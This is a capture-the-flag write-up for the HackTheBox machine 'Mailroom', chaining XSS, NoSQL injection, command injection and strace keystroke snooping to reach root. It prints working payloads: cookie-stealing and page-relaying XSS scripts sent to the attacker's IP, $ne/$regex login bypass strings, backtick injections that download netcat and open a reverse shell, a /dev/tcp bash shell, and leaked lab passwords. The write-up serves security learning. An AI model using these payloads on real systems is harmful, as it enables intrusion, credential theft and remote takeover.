---
title: "HackTheBox - Mailroom"
date: 2023-08-19T22:25:45-05:00
tags: ["Gitea","Keepass","Command Injection","XSS","NoSQL Injection","strace"]
description: "Mailroom is a hard difficulty box with a contact form vulnerable to XSS as well as a publicly accessible gitea repository for a private web server on the box. Using XSS combined with XMLHttpRequest, we can make our xss victim access the private web page on our behalf.  By reviewing the source code, we can identify a NoSQL injection vulnerability that allows us to leak login credentials for a user. The login credentials are re-used as login credentials to the Mailroom machine, allowing us to view the page now through port forwarding. The private website also contains a command injection vulnerability, which allows us to explore the docker container it operates. We find more user credentials enumerating the gitea config, and we see this user possesses a keepass vault that is frequently being accessed. Using strace, we can spy on the inputs being supplied and retrieve the vault password. The vault contains credentials for the box's root user." 
image: "Mailroom.png"
categories: ["Hack The Box"]
---
## Enumeration
initial nmap:
```
# Nmap 7.93 scan initiated Sun Apr 16 09:30:53 2023 as: nmap -sCV -p 22,80 -oN nmap_scriptports.txt 10.129.208.171
Nmap scan report for 10.129.208.171
Host is up (0.017s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 94bb2ffcaeb9b182afd789811aa76ce5 (RSA)
|   256 821beb758b9630cf946e7957d9ddeca7 (ECDSA)
|_  256 19fb45feb9e4275de5bbf35497dd68cf (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: The Mail Room
|_http-server-header: Apache/2.4.54 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Apr 16 09:31:00 2023 -- 1 IP address (1 host up) scanned in 7.58 seconds
```

### XSS vulnerability found in contact submission form

Exploring the webpages, we find a contact page that allows us to submit questions.

![Contact form](Images/ContactForm.png)

Submitting a query suggests it might be viewed by an admin:

![Submit Response](Images/SubmitResponse.png)

This has potential for XSS, and since we can view it ourselves we can do an easy check:

```js
<script>alert(1)</script>
```

![XSS Proof](Images/xss.png)

We see successful alert message. XSS is possible. From here we can possibly grab admin information such as cookies?
Using xss payload:

```js
<script type="text/javascript">document.location="http://10.10.14.35/?c="+document.cookie;</script>
```

On attacker machine:

```bash
$ nc -nvlp 80  
listening on [any] 80 ...
connect to [10.10.14.35] from (UNKNOWN) [10.129.209.135] 54046
GET /?c= HTTP/1.1
Host: 10.10.14.35
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1/
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```

### Sensitive Gitea repository accessible in a subdomain

The machine successfully reaches out, but we don't see any cookies. While exploring this, I had also ran subdomain enumeration:

```bash
$ gobuster vhost -u http://mailroom.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://mailroom.htb/
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:      gobuster/3.5
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/04/16 10:45:43 Starting gobuster in VHOST enumeration mode
===============================================================
Found: git.mailroom.htb Status: 200 [Size: 13201]
```

We see a hit for http://git.mailroom.htb so let's explore this site for now

Exploring around without signing in, we can see a public repo for matthew named `staffroom`.

![Gitea repo](Images/GiteaStaffroom.png)

In the `auth.php` file, we can see a change noted as "fixed path bug & email spam". The change looks potentially interesting, so we can we can check the changes with this commit.

#### Information on a private subdomain is leaked

![](Images/AuthphpChange.png)

The change is focused on not sending more 2fa requests if a minute has not passed. However, it is worth noting that we find yet another subdomain this way: `http://staff-review-panel.mailroom.htb`. Based on the sensitive nature of the title, we shouldn't expect to be able to access this page externally or without credentials. Visitng the page shows that it is publicly accessible, but needs some additional authentication.

![](Images/Forbidden.png)

## Foothold
### Leveraging XSS to reach the private subdomain
Recalling the XSS trick discovered earlier, we were able to redirect someone's or something's session back to our machine, although there were no cookies for that main site. Perhaps this exploited session is able to access this subdomain for us?

This exploit idea is also covered in [write-ups for crossfit](https://0xdf.gitlab.io/2021/03/20/htb-crossfit.html), an insane difficulty box previously retired. The idea is to abuse XSS to perform requests as an authorized user, then relay the information back to our machine in the form of http post requests.

Instead of crafting a new XSS payload every time, it is easier to write an XSS that retrieves a script from our local machine and then executes it:
`<script src="http://10.10.14.35/at.js"></script>`

To make the process even more simple, we can write the request as a curl request. Burp Repeater is good for this as well:
```bash
curl -X POST http://mailroom.htb/contact.php -d "email=<script+src%3d"http%3a//10.10.14.35/at.js"></script>&title=a&message=a"
```

Now when the XSS activates, it will reach back to our attacker address `10.10.14.35` and execute script from `at.js`. I can easily make quick edits to `at.js` and send another curl to execute a new command.
at.js (inspired from 0xdf's crossfit writeup):

```js
var fetch_req = new XMLHttpRequest();
fetch_req.onreadystatechange = function() {
    if(fetch_req.readyState == XMLHttpRequest.DONE) {
        var exfil_req = new XMLHttpRequest();
        exfil_req.open("POST", "http://10.10.14.35:9001", false);
        exfil_req.send("Resp Code: " + fetch_req.status + "\nPage Source:\n" + fetch_req.response);
    }
};
fetch_req.open("GET", "http://staff-review-panel.mailroom.htb/", false);
fetch_req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
fetch_req.send();
```

In this script, we have a GET request pointed at staff-review-panel, then the content is sent back to our attacking machine, port 9001 as a POST.

```bash
$ nc -vlp 9001
listening on [any] 9001 ...
connect to [10.10.14.35] from (UNKNOWN) [10.10.11.209] 33536
POST / HTTP/1.1
Host: 10.10.14.35:9001
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1/
Content-Type: text/plain;charset=UTF-8
Content-Length: 2399
Origin: http://127.0.0.1
Connection: keep-alive

Resp Code: 200
Page Source:

<!DOCTYPE html>
<html lang="en">
<...SNIP...>
```

Examining the source code a little we can find that it actually matches the gitea staffroom code. Perhaps we can access auth.php from here?

```js
fetch_req.open("GET", "http://staff-review-panel.mailroom.htb/auth.php", false);
fetch_req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
fetch_req.send();
```

We are able to access:
```bash
$ nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.35] from (UNKNOWN) [10.10.11.209] 58294
POST / HTTP/1.1
Host: 10.10.14.35:9001
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1/
Content-Type: text/plain;charset=UTF-8
Content-Length: 89
Origin: http://127.0.0.1
Connection: keep-alive

Resp Code: 400
Page Source:
{"success":false,"message":"Email and password are required"}
```

It looks like we need to submit a valid username/password combination. 

### Abusing NoSQL injection to leak credentials

The Gitea source code tells us this is mongodb, so when I explore noSQL injection, we see that this is vulnerable:

edits in at.js
```js
fetch_req.open("POST", "http://staff-review-panel.mailroom.htb/auth.php", false);
fetch_req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
fetch_req.send("email[$ne]=asdf&password[$ne]=asdf");
```
response:
```bash
$ nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.35] from (UNKNOWN) [10.10.11.209] 57972
POST / HTTP/1.1
Host: 10.10.14.35:9001
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1/
Content-Type: text/plain;charset=UTF-8
Content-Length: 158
Origin: http://127.0.0.1
Connection: keep-alive

Resp Code: 401
Page Source:
{"success":false,"message":"Invalid input detected"}{"success":true,"message":"Check your inbox for an email with your 2FA token"}
```

By labeling email and password as `[$ne]` or "not equal to" asdf, we bypass login. However, we can achieve the same results with vague regex statements. By abusing regex guesses, we can piece together a valid email and password combination, letter by letter:

```js
fetch_req.open("POST", "http://staff-review-panel.mailroom.htb/auth.php", false);
fetch_req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
fetch_req.send("email[$regex]=^t*&password[$ne]=asdf");
```

In the above code, I designate the start of the string as `^`, guess the first letter, then wildcard the rest of the string with `*`. The regex will only pass when the guessed first letter is correct, the `t`. This method will take forever, so I used regex ranges to cover multiple letter guesses at once. By guessing half the alphabet in the first query, I can eliminate multiple letters that don't fit. Not as fast as creating a script to automate this, but still saves considerable time:

```js
fetch_req.send("email[$regex]=^t{a-m}.*&password[$ne]=asdf");
```

This regex fails, so we know the 2nd letter is between n-z.

After some time, we finally get the full email:
`tristan@mailroom.htb`. 
Now we can do the same for passwords, but it's good to remember the characters might also be capitalized, numeric, or a special char. In this case, I start by setting the regex for all uppercase letters:

```js
fetch_req.send("email=tristan@mailroom.htb&password[$regex]=^{A-Z}.*");
```

The first letter is not an uppercase letter, and a second query shows it is neither a lowercase letter. Next we can check any single digit number:

```js
fetch_req.send("email=tristan@mailroom.htb&password[$regex]=^[0-9].*");
```

Eventually, we can leak the full password as well. Now we have credentials:

```
email=tristan@mailroom.htb&password=69trisRulez!
```

With this, we can access the machine through ssh:
```bash
$ ssh tristan@mailroom.htb            
The authenticity of host 'mailroom.htb (10.10.11.209)' can't be established.
ED25519 key fingerprint is SHA256:c4alO/6TY4cZRWE6/Mr+rsUQ3AXFKUZDWmSifHVp9pQ.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'mailroom.htb' (ED25519) to the list of known hosts.
tristan@mailroom.htb's password: 
<...SNIP...>
You have mail.
tristan@mailroom:~$
```

## Access as user tristan
### Enumerating the private webpage directly through port forwarding

The ssh banner also tells us we have mail, which is will be the 2FA notifications we have been sending during our mongoDB regex adventures.

```bash
tristan@mailroom:/var/mail$ cat tristan 
Return-Path: <noreply@mailroom.htb>
X-Original-To: tristan@mailroom.htb
Delivered-To: tristan@mailroom.htb
Received: from localhost (unknown [172.19.0.5])
        by mailroom.localdomain (Postfix) with SMTP id 14BBF1AEC
        for <tristan@mailroom.htb>; Sun,  16 Apr 2023 18:02:03 +0000 (UTC)
Subject: 2FA

Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token=2a5bb5f3da937782b46ce69491f7c485
```

With our ssh capabilities, we can do SSH tunneling now to visit the internal staff-review-panel without the XSS hassle. 
```bash
$ ssh -D 1080 tristan@mailroom.htb
```

Visiting the webpage, we see the same login that we have been using, this time in a browser setting:

![Logging in with Tristan's credentials](Images/Login.png)

let's try pasting in the link that they send us from the email:

![2FA redirects us to the dashboard, with the proper cookies.](Images/Verified.png)

Finally we are in. We can see some recent activities, using an identifier that looks to be some kind of hash.

Checking the inspect page, we can view queries through once again broad regex terms

![](Images/Inspect1.png)

There are no other interesting messages. Looking at the source code for this page (again, this is the same code repository located on the `git.mailroom.htb` site), we can see how this command is being done, through a shell exec command:

```php
$data = '';
if (isset($_POST['inquiry_id'])) {
  $inquiryId = preg_replace('/[\$<>;|&{}\(\)\[\]\'\"]/', '', $_POST['inquiry_id']);
  $contents = shell_exec("cat /var/www/mailroom/inquiries/$inquiryId.html");
```

### Remote Code Execution through Command Injection

While there is some filtering done with the `preg_replace` function, it is not thorough enough. We can execute commands nested in this through use of the backtick, \`.

![](CommandExecution.png)

When we execute this, we find a connection on our local kali:
```bash
$ nc -vlp 80
listening on [any] 80 ...
connect to [10.10.14.35] from (UNKNOWN) [10.10.11.209] 47198
GET / HTTP/1.1
Host: 10.10.14.35
User-Agent: curl/7.74.0
Accept: */*
```

With this, we can connect a new shell as the web account user.

Traditional reverse shell 1-liners were very troublesome to introduce, so instead I decided to try and download `nc` from my kali, then run this binary:

```
`wget 10.10.14.35/nc -o /tmp/nc; chmod +x /tmp/nc; /tmp/nc 10.10.14.35 8888 -e /bin/bash`
```

Once again, `wget` is not well working, but I know `curl` works from my original probing. Perhaps I can curl a bash rev shell script, then pipe it directly to sh?

```bash
$ cat r.sh 
#!/bin/bash

/bin/bash -i >& /dev/tcp/10.10.14.35/8888 0>&1
```


```
`curl 10.10.14.35/r.sh | sh`
```

This doesn't work either, but finally I learn a compromise: splitting the commands into 3 requests

```
`curl 10.10.14.35/nc -o /tmp/nc`

`chmod +x /tmp/nc`

`/tmp/nc 10.10.14.35 8888 -e /bin/bash`
```

On kali listener:
```
$ nc -nvlp 8888
listening on [any] 8888 ...
connect to [10.10.14.35] from (UNKNOWN) [10.10.11.209] 51538
whoami
www-data
```

## Lateral Movement
### Enumerating docker container as www-data

Enumerating this session shows us we are not in the same box, but instead a compartmentalized container:
```
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
```
All users are gone, and in the base directory, we can see a `.dockerenv` file:
```
ls -al /
total 76
drwxr-xr-x   1 root root 4096 Apr 16 05:49 .
drwxr-xr-x   1 root root 4096 Apr 16 05:49 ..
-rwxr-xr-x   1 root root    0 Apr 16 05:49 .dockerenv
drwxr-xr-x   1 root root 4096 Jan 17  2023 bin
drwxr-xr-x   2 root root 4096 Sep  3  2022 boot
drwxr-xr-x   5 root root  340 Apr 16 05:49 dev
drwxr-xr-x   1 root root 4096 Apr 16 05:49 etc
drwxr-xr-x   2 root root 4096 Sep  3  2022 home
drwxr-xr-x   1 root root 4096 Jan 17  2023 lib
drwxr-xr-x   2 root root 4096 Nov 14  2022 lib64
drwxr-xr-x   2 root root 4096 Nov 14  2022 media
drwxr-xr-x   2 root root 4096 Nov 14  2022 mnt
drwxr-xr-x   2 root root 4096 Nov 14  2022 opt
dr-xr-xr-x 321 root root    0 Apr 16 05:49 proc
drwx------   1 root root 4096 Apr 20 14:08 root
drwxr-xr-x   1 root root 4096 Nov 15  2022 run
drwxr-xr-x   1 root root 4096 Jan 17  2023 sbin
drwxr-xr-x   2 root root 4096 Nov 14  2022 srv
dr-xr-xr-x  13 root root    0 Apr 16 05:49 sys
drwxrwxrwt   1 root root 4096 Apr 16 18:43 tmp
drwxr-xr-x   1 root root 4096 Nov 14  2022 usr
drwxr-xr-x   1 root root 4096 Nov 15  2022 var
```


Enumerating this container, we can see a the hidden `.git` file within the web files:
```
ls -al
total 68
drwxr-xr-x 7 root root 4096 Jan 19  2023 .
drwxr-xr-x 5 root root 4096 Jan 15  2023 ..
drwxr-xr-x 8 root root 4096 Jan 19  2023 .git
-rw-r--r-- 1 root root    0 Jan 15  2023 README.md
-rwxr-xr-x 1 root root 3453 Jan 19  2023 auth.php
-rwxr-xr-x 1 root root   62 Jan 15  2023 composer.json
-rwxr-xr-x 1 root root 8096 Jan 15  2023 composer.lock
drwxr-xr-x 2 root root 4096 Jan 15  2023 css
-rwxr-xr-x 1 root root 5848 Jan 19  2023 dashboard.php
drwxr-xr-x 3 root root 4096 Jan 15  2023 font
-rwxr-xr-x 1 root root 2594 Jan 15  2023 index.php
-rwxr-xr-x 1 root root 6326 Jan 18  2023 inspect.php
drwxr-xr-x 2 root root 4096 Jan 15  2023 js
-rwxr-xr-x 1 root root  953 Jan 15  2023 register.html
drwxr-xr-x 6 root root 4096 Jan 15  2023 vendor
```

Checking the `.git/config` file reveals credentials for mattew:
```
cat config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://matthew:HueLover83%23@gitea:3000/matthew/staffroom.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
[user]
        email = matthew@mailroom.htb
```

While the password is shown as HueLover83%23, we know this is a url line. The %23 will convert to `#`, so the password must be `HueLover83#`. We can now log in as user matthew back on the primary machine:
```
tristan@mailroom:~$ su matthew
Password: 
matthew@mailroom:/home/tristan$
```

We can finally get the `user.txt` from matthew's home dir.

## Privilege Escalation
### Enumerating system as matthew

Also found in matthew's home dir, is a keepass file.

```
matthew@mailroom:~$ ls
personal.kdbx  personal.kdbx.lock  user.txt
```

Finding `personal.kdbx.lock` is a clear indicator that keepass vault is currently being accessed. Monitoring the folder for a little bit, we can see the lock file appear and disappear very frequently. It seems someone is accessing the keepass vault regularly. If we can perhaps spy on the session that is accessing this vault, we might be able to watch the password being input.

### Using strace to monitor processes in real time

[This article covers strace and how it might be used to leak ssh passwords.](https://jvns.ca/blog/2014/02/17/spying-on-ssh-with-strace/) If we know the process ID that is accessing this kdbx, we can utilize this strategy.

To watch processes in real time, I use `top`:
```
matthew@mailroom:~$ top
```

![](Images/Top.png)

We can see kpcli (the keepass command line interface program) and its PID, as it appears and disappears in real time. In another shell session, I submit an strace process once I see kpcli appear:

strace output:
```
matthew@mailroom:~$ strace -p 107030
strace: Process 107030 attached
pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
read(3, "m", 1)                         = 1
select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
write(4, "m", 1)                        = 1
pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
read(3, "a", 1)                         = 1
select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
write(4, "a", 1)                        = 1
pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
read(3, "t", 1)                         = 1
select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
write(4, "t", 1)                        = 1
<...SNIP...>
```
The output is messy, but we can see the information of letters being inputted and an echo, likely related to the character being reflected back in the command line. We can clean it up a bit by grepping for read or write:
```
$ cat trace| grep read
read(3, "m", 1)                         = 1
read(3, "a", 1)                         = 1
read(3, "t", 1)                         = 1
read(3, "t", 1)                         = 1
read(3, "h", 1)                         = 1
read(3, "e", 1)                         = 1
read(3, "w", 1)                         = 1
read(3, "/", 1)                         = 1
read(3, "p", 1)                         = 1
read(3, "e", 1)                         = 1
read(3, "r", 1)                         = 1
read(3, "s", 1)                         = 1
read(3, "o", 1)                         = 1
read(3, "n", 1)                         = 1
read(3, "a", 1)                         = 1
read(3, "l", 1)                         = 1
read(3, ".", 1)                         = 1
read(3, "k", 1)                         = 1
read(3, "d", 1)                         = 1
read(3, "b", 1)                         = 1
read(3, "x", 1)                         = 1
read(3, "\n", 1)                        = 1
```

Here at the start, we can see the keepass file being accessed.
The next section has what looks to be probably the master password:
```
read(0, "!", 8192)                      = 1
read(0, "s", 8192)                      = 1
read(0, "E", 8192)                      = 1
read(0, "c", 8192)                      = 1
read(0, "U", 8192)                      = 1
read(0, "r", 8192)                      = 1
read(0, "3", 8192)                      = 1
read(0, "p", 8192)                      = 1
read(0, "4", 8192)                      = 1
read(0, "$", 8192)                      = 1
read(0, "$", 8192)                      = 1
read(0, "w", 8192)                      = 1
read(0, "0", 8192)                      = 1
read(0, "1", 8192)                      = 1
read(0, "\10", 8192)                    = 1
read(0, "r", 8192)                      = 1
read(0, "d", 8192)                      = 1
read(0, "9", 8192)                      = 1
read(0, "\n", 8192)                     = 1
```

### Acessing the keepass vault & troubleshooting the password

The line `"\10"` sticks out as odd, since this is reporting 1 character/keystroke at a time. If we exclude that input, the password becomes `!sEcUr3p4$$w01rd9`.  Trying this password does not work, but looking at the password itself the `1` seems out of place: the password appears to be the words `secure` and `password`. Omitting `1` gives us a working password: `!sEcUr3p4$$w0rd9`, and now the `\10` character becomes more clear: the user must have inputted a 1 as a mistake, then deleted it with backspace. The deletion keystroke appeared in the trace as `\10`, and the password was fixed for login purposes.

Viewing the keepass vault shows multiple password entries, but one is clearly more noteworthy than the rest: the root account.

![Keepass Vault](Images/KeepassVault.png)

We can right click and select `copy password` to temporarily place the password into our clipboard, or we can view the password plain through `edit entry`:

![](Images/RootPass.png)

With this, we can `su` to root straight from matthew:
```
matthew@mailroom:~$ su
Password: 
root@mailroom:/home/matthew#
```

Bonus: inspecting the scripts from the root folder shows that the `\10` char is indeed a deletion
```python
#!/usr/bin/python3
import os, random, time, hashlib
import pexpect

## This script is used to simulate matthew logging into his database in real time
<...SNIP...>

send_human(k, f'open {db_path}')
            k.expect('Please provide the master password: ')
            send_human(k, '!sEcUr3p4$$w01\010rd9')  # \010 is a del character
```

## Reflection
As my first live hard box completion, I was thoroughly impressed by the complexity of the attack chain leveraged to gain a foothold. Between the constant abuse of XSS to the extremely frequent `kpcli` processes, this box might not be the most realistic, but I enjoyed every trick utilized throughout. I also appreciated the "leaked code" viewable on the git subdomain, and how it is used to showcase multiple different code vulnerabilities used at different spots within this box.
